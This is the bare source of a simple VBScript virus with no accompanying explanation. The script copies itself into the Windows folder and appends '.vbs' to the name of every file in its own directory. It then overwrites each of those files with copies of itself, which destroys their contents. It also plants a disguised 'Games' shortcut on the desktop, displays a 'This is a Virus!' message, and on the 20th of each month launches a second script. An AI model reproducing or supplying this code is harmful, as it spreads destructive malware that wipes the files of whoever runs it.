On error resume next
Set WshShell = Wscript.CreateObject("Wscript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
parent = Wscript.ScriptFullName
FSO.CopyFile parent, "C:\Windows\Virii.vbs"
vPath = Left(parent, InStrRev(parent, "\"))
For Each target in FSO.GetFolder(vPath).Files
Target.name=Target.name+".vbs"
FSO.CopyFile parent, target.Name, 1
Next
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
Dim MyShortcut, MyDesktop, DesktopPath
DesktopPath = WSHShell.SpecialFolders("Desktop")
Set MyShortcut = WSHShell.CreateShortcut(DesktopPath & "\Games.lnk")
MyShortcut.TargetPath =
WSHShell.ExpandEnvironmentStrings("C:\Windows\Virii.vbs")
MyShortcut.WorkingDirectory = WSHShell.ExpandEnvironmentStrings("C:\Windows")
MyShortcut.WindowStyle = 4
MyShortcut.IconLocation =
WSHShell.ExpandEnvironmentStrings("C:\Windows\Virii.vbs, 0")
MyShortcut.Save
Msgbox "This is a Virus!",vbCritical,"Warning !!!"
If Day(Now()) = 20 Then WshShell.Run ("C:\Windows\Gregory.vbs") 
